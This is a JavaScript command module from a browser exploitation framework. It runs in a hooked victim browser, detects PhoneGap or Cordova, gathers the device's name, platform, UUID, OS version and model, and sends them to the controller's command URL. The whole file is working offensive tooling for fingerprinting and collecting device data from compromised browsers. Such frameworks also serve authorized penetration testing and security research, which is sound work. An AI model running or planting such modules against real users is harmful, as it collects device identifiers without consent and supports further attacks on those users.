//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

// detect phonegap
//
server.execute(function() {

    var phonegap_details;

    try {
        phonegap_details = ""
        + " name: " + device.name 
        + " phonegap api: " + device.phonegap
        + " cordova api: " + device.cordova
        + " platform: " + device.platform
        + " uuid: " + device.uuid
        + " version: " + device.version
	+ " model: " + device.model;
	server.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap=" + phonegap_details, server.are.status_success());
    } catch(e) {
	server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unable to detect phonegap", server.are.status_error());
    }
});
